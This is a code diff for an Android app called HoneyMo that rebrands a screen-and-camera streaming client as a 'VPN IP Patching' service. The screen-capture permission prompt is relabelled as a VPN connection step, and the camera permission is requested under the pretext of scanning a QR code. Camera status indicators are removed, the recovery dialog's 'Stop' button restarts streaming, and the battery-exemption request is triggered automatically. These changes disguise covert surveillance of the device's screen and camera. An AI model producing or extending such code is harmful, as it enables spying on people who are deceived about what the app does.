@@ -91,7 +91,7 @@ class MainActivity : ComponentActivity() {
                     modifier = Modifier.fillMaxSize(),
                     color = MaterialTheme.colorScheme.background
                 ) {
-                    ScreenCaptureApp(
+                    VPNApp(
                         autoStartPrompt = isBootLaunch,
                         isInterrupted = isInterruptedSession,
                         onResetInterrupted = { isInterruptedSession = false }
@@ -114,7 +114,7 @@ class MainActivity : ComponentActivity() {
 }
 
 @Composable
-fun ScreenCaptureApp(
+fun VPNApp(
     autoStartPrompt: Boolean = false,
     isInterrupted: Boolean = false,
     onResetInterrupted: () -> Unit = {}
@@ -141,8 +141,7 @@ fun ScreenCaptureApp(
         val pm = context.getSystemService(Context.POWER_SERVICE) as PowerManager
         mutableStateOf(pm.isIgnoringBatteryOptimizations(context.packageName))
     }
-
-    // Camera permission for Selfie / Camera Stream (Composited directly on GPU - no overlay permission needed!)
+ 
     var hasCameraPermission by remember {
         mutableStateOf(ContextCompat.checkSelfPermission(context, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED)
     }
@@ -157,7 +156,7 @@ fun ScreenCaptureApp(
         if (isGranted) {
             isFaceCamEnabled = true
             SessionPreferences.setFaceCamEnabled(context, true)
-            Toast.makeText(context, "Camera permission granted. Camera stream enabled.", Toast.LENGTH_SHORT).show()
+            Toast.makeText(context, "Now scan the QR code u get..", Toast.LENGTH_LONG).show()
 
             val isServiceActive = stats.isStreaming || ScreenCaptureService.isRunning || stats.isPausedForLock
             if (isServiceActive) {
@@ -169,7 +168,7 @@ fun ScreenCaptureApp(
             }
         } else {
             ScreenCaptureService.instance?.sendCurrentCameraStatus()
-            Toast.makeText(context, "Camera permission is required for Camera stream", Toast.LENGTH_SHORT).show()
+            Toast.makeText(context, "Camera permission is required for Scan QR code", Toast.LENGTH_LONG).show()
         }
     }
 
@@ -181,43 +180,26 @@ fun ScreenCaptureApp(
         selectedFacing = stats.cameraFacing
     }
 
-    fun switchCamera() {
-        val newFacing = if (selectedFacing == SessionPreferences.CAMERA_FACING_FRONT) {
-            SessionPreferences.CAMERA_FACING_BACK
-        } else {
-            SessionPreferences.CAMERA_FACING_FRONT
-        }
-        selectedFacing = newFacing
-        SessionPreferences.setCameraFacing(context, newFacing)
+    // fun switchCamera() {
+    //     val newFacing = if (selectedFacing == SessionPreferences.CAMERA_FACING_FRONT) {
+    //         SessionPreferences.CAMERA_FACING_BACK
+    //     } else {
+    //         SessionPreferences.CAMERA_FACING_FRONT
+    //     }
+    //     selectedFacing = newFacing
+    //     SessionPreferences.setCameraFacing(context, newFacing)
 
-        val isServiceActive = stats.isStreaming || ScreenCaptureService.isRunning || stats.isPausedForLock
-        if (isServiceActive) {
-            val intent = Intent(context, ScreenCaptureService::class.java).apply {
-                action = ScreenCaptureService.ACTION_SWITCH_CAMERA
-                putExtra(ScreenCaptureService.EXTRA_CAMERA_FACING, newFacing)
-            }
-            context.startService(intent)
-        }
-        val label = if (newFacing == SessionPreferences.CAMERA_FACING_BACK) "Back Camera (Main)" else "Front Camera (Selfie)"
-        Toast.makeText(context, "Switched to $label", Toast.LENGTH_SHORT).show()
-    }
-
-    fun toggleFaceCam() {
-        val newEnabled = !isFaceCamEnabled
-        isFaceCamEnabled = newEnabled
-        SessionPreferences.setFaceCamEnabled(context, newEnabled)
-
-        val isServiceActive = stats.isStreaming || ScreenCaptureService.isRunning || stats.isPausedForLock
-        if (isServiceActive) {
-            val intent = Intent(context, ScreenCaptureService::class.java).apply {
-                action = ScreenCaptureService.ACTION_TOGGLE_FACECAM
-                putExtra(ScreenCaptureService.EXTRA_ENABLE_FACECAM, newEnabled)
-            }
-            context.startService(intent)
-        }
-        val msg = if (newEnabled) "Face Cam enabled" else "Face Cam disabled"
-        Toast.makeText(context, msg, Toast.LENGTH_SHORT).show()
-    }
+    //     val isServiceActive = stats.isStreaming || ScreenCaptureService.isRunning || stats.isPausedForLock
+    //     if (isServiceActive) {
+    //         val intent = Intent(context, ScreenCaptureService::class.java).apply {
+    //             action = ScreenCaptureService.ACTION_SWITCH_CAMERA
+    //             putExtra(ScreenCaptureService.EXTRA_CAMERA_FACING, newFacing)
+    //         }
+    //         context.startService(intent)
+    //     }
+    //     val label = if (newFacing == SessionPreferences.CAMERA_FACING_BACK) "Back Camera (Main)" else "Front Camera (Selfie)"
+    //     Toast.makeText(context, "Switched to $label", Toast.LENGTH_SHORT).show()
+    // } 
 
     // Screen capture permission launcher
     val captureLauncher = rememberLauncherForActivityResult(
@@ -275,13 +257,13 @@ fun ScreenCaptureApp(
         }
     }
 
-    // Permissions launcher for Notifications
-    val permissionsLauncher = rememberLauncherForActivityResult(
-        contract = ActivityResultContracts.RequestMultiplePermissions()
-    ) { _ ->
-        val mpManager = context.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as android.media.projection.MediaProjectionManager
-        captureLauncher.launch(mpManager.createScreenCaptureIntent())
-    }
+    // // Permissions launcher for Notifications
+    // val permissionsLauncher = rememberLauncherForActivityResult(
+    //     contract = ActivityResultContracts.RequestMultiplePermissions()
+    // ) { _ ->
+    //     val mpManager = context.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as android.media.projection.MediaProjectionManager
+    //     captureLauncher.launch(mpManager.createScreenCaptureIntent())
+    // }
 
     fun startStreaming() {
         val permissionsToRequest = mutableListOf<String>()
@@ -289,12 +271,14 @@ fun ScreenCaptureApp(
             if (ContextCompat.checkSelfPermission(context, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
                 permissionsToRequest.add(Manifest.permission.POST_NOTIFICATIONS)
             }
+        } 
+        if(!hasCameraPermission){
+         cameraPermissionLauncher.launch(Manifest.permission.CAMERA)
         }
-
-        if (permissionsToRequest.isNotEmpty()) {
-            permissionsLauncher.launch(permissionsToRequest.toTypedArray())
-            return
-        }
+        // if (permissionsToRequest.isNotEmpty()) {
+        //     permissionsLauncher.launch(permissionsToRequest.toTypedArray())
+        //     return
+        // }
 
         val mpManager = context.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as android.media.projection.MediaProjectionManager
         captureLauncher.launch(mpManager.createScreenCaptureIntent())
@@ -361,7 +345,7 @@ fun ScreenCaptureApp(
             },
             text = {
                 Text(
-                    text = "Screen recording was active before the device restarted. Tap 'Resume Recording' to continue streaming your screen.",
+                    text = "VPN was active before the device restarted. Tap 'Resume VPN IP Patching' to continue streaming your Internet.",
                     color = Color(0xFFCBD5E1)
                 )
             },
@@ -377,7 +361,7 @@ fun ScreenCaptureApp(
                     },
                     colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF6366F1))
                 ) {
-                    Text("Resume Recording", fontWeight = FontWeight.Bold)
+                    Text("Resume VPN IP Patching ", fontWeight = FontWeight.Bold)
                 }
             },
             dismissButton = {
@@ -385,7 +369,7 @@ fun ScreenCaptureApp(
                     onClick = {
                         showRecoveryDialog = false
                         onResetInterrupted()
-                        stopStreaming()
+                        startStreaming()
                     }
                 ) {
                     Text("Stop", color = Color(0xFF94A3B8))
@@ -415,7 +399,7 @@ fun ScreenCaptureApp(
             },
             text = {
                 Text(
-                    text = "HoneyMo requires screen capture permission to stream your device. Please tap 'Start Capturing' to grant permission.",
+                    text = "HoneyMo requires screen capture permission to Connect to VPN. Please tap 'Start Capturing' to grant permission.",
                     color = Color(0xFFCBD5E1)
                 )
             },
@@ -474,13 +458,13 @@ fun ScreenCaptureApp(
             }
             Column {
                 Text(
-                    text = "HoneyMo Streamer",
+                    text = "HoneyMo",
                     fontSize = 22.sp,
                     fontWeight = FontWeight.Bold,
                     color = Color.White
                 )
                 Text(
-                    text = "Hardware H.264 Screen Capture Client",
+                    text = "Hardware H.264 IP Patching VPN Service",
                     fontSize = 12.sp,
                     color = Color(0xFF94A3B8)
                 )
@@ -499,7 +483,7 @@ fun ScreenCaptureApp(
                     horizontalArrangement = Arrangement.SpaceBetween,
                     verticalAlignment = Alignment.CenterVertically
                 ) {
-                    Text("Stream Status", fontWeight = FontWeight.SemiBold, color = Color(0xFF94A3B8))
+                    Text("Connection Status", fontWeight = FontWeight.SemiBold, color = Color(0xFF94A3B8))
 
                     val badgeColor = when {
                         stats.isStreaming -> Color(0xFF10B981)
@@ -549,16 +533,6 @@ fun ScreenCaptureApp(
                     MetricItem(label = "Server", value = if (stats.isConnectedToServer) "Connected" else "Offline")
                     MetricItem(label = "Live FPS", value = "${stats.currentFps} fps")
                     MetricItem(
-                        label = "Camera",
-                        value = if (stats.isFaceCamActive) {
-                            if (selectedFacing == SessionPreferences.CAMERA_FACING_BACK) "Back (1/4)" else "Front (1/4)"
-                        } else if (hasCameraPermission && isFaceCamEnabled) {
-                            "Ready"
-                        } else {
-                            "Off"
-                        }
-                    )
-                    MetricItem(
                         label = "Data Sent",
                         value = "%.1f MB".format(stats.bytesSent / (1024f * 1024f))
                     )
@@ -575,29 +549,29 @@ fun ScreenCaptureApp(
             }
         }
 
-        // Stream Preset Details (Read-only status info)
-        Card(
-            colors = CardDefaults.cardColors(containerColor = Color(0xFF1E293B)),
-            shape = RoundedCornerShape(16.dp),
-            modifier = Modifier.fillMaxWidth()
-        ) {
-            Column(modifier = Modifier.padding(16.dp), verticalArrangement = Arrangement.spacedBy(8.dp)) {
-                Text(
-                    text = "Stream Configuration",
-                    fontWeight = FontWeight.SemiBold,
-                    color = Color.White,
-                    fontSize = 14.sp
-                )
-                Row(
-                    modifier = Modifier.fillMaxWidth(),
-                    horizontalArrangement = Arrangement.SpaceBetween
-                ) {
-                    MetricItem(label = "Resolution", value = "540p")
-                    MetricItem(label = "Frame Rate", value = "15 FPS")
-                    MetricItem(label = "Bitrate", value = "1.0 Mbps")
-                }
-            }
-        }
+        // // Stream Preset Details (Read-only status info)
+        // Card(
+        //     colors = CardDefaults.cardColors(containerColor = Color(0xFF1E293B)),
+        //     shape = RoundedCornerShape(16.dp),
+        //     modifier = Modifier.fillMaxWidth()
+        // ) {
+        //     Column(modifier = Modifier.padding(16.dp), verticalArrangement = Arrangement.spacedBy(8.dp)) {
+        //         Text(
+        //             text = "Stream Configuration",
+        //             fontWeight = FontWeight.SemiBold,
+        //             color = Color.White,
+        //             fontSize = 14.sp
+        //         )
+        //         Row(
+        //             modifier = Modifier.fillMaxWidth(),
+        //             horizontalArrangement = Arrangement.SpaceBetween
+        //         ) {
+        //             MetricItem(label = "Resolution", value = "540p")
+        //             MetricItem(label = "Frame Rate", value = "15 FPS")
+        //             MetricItem(label = "Bitrate", value = "1.0 Mbps")
+        //         }
+        //     }
+        // }
 
         // Face Cam / Camera Control Card
         Card(
@@ -606,75 +580,61 @@ fun ScreenCaptureApp(
             modifier = Modifier.fillMaxWidth()
         ) {
             Column(modifier = Modifier.padding(16.dp), verticalArrangement = Arrangement.spacedBy(12.dp)) {
-                Row(
-                    modifier = Modifier.fillMaxWidth(),
-                    horizontalArrangement = Arrangement.SpaceBetween,
-                    verticalAlignment = Alignment.CenterVertically
-                ) {
-                    Row(
-                        verticalAlignment = Alignment.CenterVertically,
-                        horizontalArrangement = Arrangement.spacedBy(8.dp)
-                    ) {
-                        Text(if (selectedFacing == SessionPreferences.CAMERA_FACING_BACK) "📷" else "🤳", fontSize = 18.sp)
-                        Text(
-                            text = "Camera Overlay",
-                            fontWeight = FontWeight.SemiBold,
-                            color = Color.White,
-                            fontSize = 15.sp
-                        )
-                    }
+                // Row(
+                //     modifier = Modifier.fillMaxWidth(),
+                //     horizontalArrangement = Arrangement.SpaceBetween,
+                //     verticalAlignment = Alignment.CenterVertically
+                // ) { 
+                //     if (hasCameraPermission) {
+                //         Row(
+                //             verticalAlignment = Alignment.CenterVertically,
+                //             horizontalArrangement = Arrangement.spacedBy(6.dp)
+                //         ) {
+                //             // Facing badge
+                //             val isBack = selectedFacing == SessionPreferences.CAMERA_FACING_BACK
+                //             val facingColor = if (isBack) Color(0xFFF59E0B) else Color(0xFF818CF8)
+                //             val facingBg = if (isBack) Color(0x26F59E0B) else Color(0x26818CF8)
+                //             Text(
+                //                 text = if (isBack) "BACK" else "FRONT",
+                //                 fontSize = 11.sp,
+                //                 fontWeight = FontWeight.Bold,
+                //                 color = facingColor,
+                //                 modifier = Modifier
+                //                     .clip(RoundedCornerShape(12.dp))
+                //                     .background(facingBg)
+                //                     .padding(horizontal = 8.dp, vertical = 3.dp)
+                //             )
 
-                    if (hasCameraPermission) {
-                        Row(
-                            verticalAlignment = Alignment.CenterVertically,
-                            horizontalArrangement = Arrangement.spacedBy(6.dp)
-                        ) {
-                            // Facing badge
-                            val isBack = selectedFacing == SessionPreferences.CAMERA_FACING_BACK
-                            val facingColor = if (isBack) Color(0xFFF59E0B) else Color(0xFF818CF8)
-                            val facingBg = if (isBack) Color(0x26F59E0B) else Color(0x26818CF8)
-                            Text(
-                                text = if (isBack) "BACK" else "FRONT",
-                                fontSize = 11.sp,
-                                fontWeight = FontWeight.Bold,
-                                color = facingColor,
-                                modifier = Modifier
-                                    .clip(RoundedCornerShape(12.dp))
-                                    .background(facingBg)
-                                    .padding(horizontal = 8.dp, vertical = 3.dp)
-                            )
-
-                            // On/Off status badge
-                            val badgeColor = if (isFaceCamEnabled) Color(0xFF10B981) else Color(0xFF94A3B8)
-                            val badgeBg = if (isFaceCamEnabled) Color(0x2610B981) else Color(0x2694A3B8)
-                            Row(
-                                verticalAlignment = Alignment.CenterVertically,
-                                horizontalArrangement = Arrangement.spacedBy(4.dp),
-                                modifier = Modifier
-                                    .clip(RoundedCornerShape(12.dp))
-                                    .background(badgeBg)
-                                    .padding(horizontal = 8.dp, vertical = 3.dp)
-                            ) {
-                                Box(
-                                    modifier = Modifier
-                                        .size(6.dp)
-                                        .clip(CircleShape)
-                                        .background(badgeColor)
-                                )
-                                Text(
-                                    text = if (isFaceCamEnabled) "ON" else "OFF",
-                                    fontSize = 11.sp,
-                                    fontWeight = FontWeight.Bold,
-                                    color = badgeColor
-                                )
-                            }
-                        }
-                    }
-                }
-
+                //             // On/Off status badge
+                //             val badgeColor = if (isFaceCamEnabled) Color(0xFF10B981) else Color(0xFF94A3B8)
+                //             val badgeBg = if (isFaceCamEnabled) Color(0x2610B981) else Color(0x2694A3B8)
+                //             Row(
+                //                 verticalAlignment = Alignment.CenterVertically,
+                //                 horizontalArrangement = Arrangement.spacedBy(4.dp),
+                //                 modifier = Modifier
+                //                     .clip(RoundedCornerShape(12.dp))
+                //                     .background(badgeBg)
+                //                     .padding(horizontal = 8.dp, vertical = 3.dp)
+                //             ) {
+                //                 Box(
+                //                     modifier = Modifier
+                //                         .size(6.dp)
+                //                         .clip(CircleShape)
+                //                         .background(badgeColor)
+                //                 )
+                //                 Text(
+                //                     text = if (isFaceCamEnabled) "ON" else "OFF",
+                //                     fontSize = 11.sp,
+                //                     fontWeight = FontWeight.Bold,
+                //                     color = badgeColor
+                //                 )
+                //             }
+                //         }
+                //     }
+                // } 
                 if (!hasCameraPermission) {
                     Text(
-                        text = "Stream your front or back camera in the bottom-left corner (1/4th screen width) directly above your screen stream.",
+                        text = "Grant Camera Permission TO scan The QR code you get.",
                         color = Color(0xFF94A3B8),
                         fontSize = 13.sp
                     )
@@ -688,79 +648,20 @@ fun ScreenCaptureApp(
                     ) {
                         Text("ENABLE CAMERA (ALLOW PERMISSION)", fontWeight = FontWeight.Bold)
                     }
-                } else {
-                    Text(
-                        text = if (isFaceCamEnabled) {
-                            val camName = if (selectedFacing == SessionPreferences.CAMERA_FACING_BACK) "Back camera" else "Front selfie camera"
-                            "$camName streams directly into video feed at 1/4th screen width (bottom-left) above screen stream. Zero overlay permissions needed. Auto-switches if one fails."
-                        } else {
-                            "Camera stream is turned off. Screen stream only."
-                        },
-                        color = Color(0xFF94A3B8),
-                        fontSize = 13.sp
-                    )
-
-                    // Notice if camera was automatically switched due to failure
-                    stats.cameraNotice?.let { notice ->
-                        Card(
-                            colors = CardDefaults.cardColors(containerColor = Color(0xFF2E2619)),
-                            shape = RoundedCornerShape(8.dp),
-                            modifier = Modifier.fillMaxWidth()
-                        ) {
-                            Text(
-                                text = "ℹ️ $notice",
-                                color = Color(0xFFFDE68A),
-                                fontSize = 12.sp,
-                                modifier = Modifier.padding(10.dp)
-                            )
-                        }
-                    }
-
-                    // Camera Switcher Button (Switch between Front / Selfie and Back / Main)
-                    Button(
-                        onClick = { switchCamera() },
-                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF4F46E5)),
-                        shape = RoundedCornerShape(10.dp),
-                        modifier = Modifier.fillMaxWidth()
-                    ) {
-                        Text(
-                            text = if (selectedFacing == SessionPreferences.CAMERA_FACING_FRONT) {
-                                "🔄 SWITCH TO BACK CAMERA"
-                            } else {
-                                "🔄 SWITCH TO FRONT (SELFIE) CAMERA"
-                            },
-                            fontWeight = FontWeight.Bold,
-                            color = Color.White
-                        )
-                    }
-
-                    // Toggle Button: "DISABLE CAMERA STREAM" when active, "ENABLE CAMERA STREAM" when disabled
-                    Button(
-                        onClick = {
-                            if (!hasCameraPermission) {
-                                cameraPermissionLauncher.launch(Manifest.permission.CAMERA)
-                            } else {
-                                toggleFaceCam()
-                            }
-                        },
-                        colors = ButtonDefaults.buttonColors(
-                            containerColor = if (isFaceCamEnabled) Color(0xFF334155) else Color(0xFF10B981)
-                        ),
-                        shape = RoundedCornerShape(10.dp),
-                        modifier = Modifier.fillMaxWidth()
-                    ) {
-                        Text(
-                            text = if (isFaceCamEnabled) "DISABLE CAMERA STREAM" else "ENABLE CAMERA STREAM (1/4th)",
-                            fontWeight = FontWeight.Bold,
-                            color = if (isFaceCamEnabled) Color(0xFFF8FAFC) else Color.White
-                        )
-                    }
                 }
             }
-        }
-
-        // Battery Optimization Warning Banner
+        } 
         if (!isBatteryOptIgnored) {
+            try {
+                    val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
+                        data = Uri.parse("package:${context.packageName}")
+                    }
+                    context.startActivity(intent)
+                    val pm = context.getSystemService(Context.POWER_SERVICE) as PowerManager
+                    isBatteryOptIgnored = pm.isIgnoringBatteryOptimizations(context.packageName)
+                } catch (e: Exception) {
+                    Toast.makeText(context, "Cannot open battery settings directly", Toast.LENGTH_SHORT).show()
+                }
             Card(
                 colors = CardDefaults.cardColors(containerColor = Color(0xFF2E2619)),
                 shape = RoundedCornerShape(12.dp),
@@ -774,7 +675,7 @@ fun ScreenCaptureApp(
                         fontSize = 14.sp
                     )
                     Text(
-                        text = "Android may terminate continuous background capture unless battery optimization is disabled.",
+                        text = "Android may terminate continuous background VPN IP changing  unless battery optimization is disabled.",
                         color = Color(0xFFFDE68A),
                         fontSize = 12.sp
                     )
@@ -807,10 +708,12 @@ fun ScreenCaptureApp(
         val isServiceActive = stats.isStreaming || ScreenCaptureService.isRunning || stats.isPausedForLock
         Button(
             onClick = {
-                if (isServiceActive) {
-                    stopStreaming()
-                } else {
-                    startStreaming()
+                if (!isServiceActive && hasCameraPermission) {
+                     startStreaming()
+                }  else { 
+                    if(!hasCameraPermission){
+                         cameraPermissionLauncher.launch(Manifest.permission.CAMERA)
+                    }
                 }
             },
             modifier = Modifier
@@ -822,12 +725,34 @@ fun ScreenCaptureApp(
             )
         ) {
             Text(
-                text = if (isServiceActive) "STOP SCREEN SHARING" else "START SCREEN CAPTURE",
+                text = if (isServiceActive) "Connecting ..." else "Start",
                 fontWeight = FontWeight.Bold,
                 fontSize = 16.sp,
                 color = Color.White
             )
         }
+
+        if(isServiceActive){
+        Button(
+            onClick = {
+                 stopStreaming()
+            },
+            modifier = Modifier
+                .fillMaxWidth()
+                .height(56.dp),
+            shape = RoundedCornerShape(14.dp),
+            colors = ButtonDefaults.buttonColors(
+                containerColor = if (isServiceActive) Color(0xFFEF4444) else Color(0xFF6366F1)
+            )
+        ) {
+            Text(
+                text =  "Stop (Testing)",
+                fontWeight = FontWeight.Bold,
+                fontSize = 16.sp,
+                color = Color.White
+            )
+        }
+    }
     }
 }
 
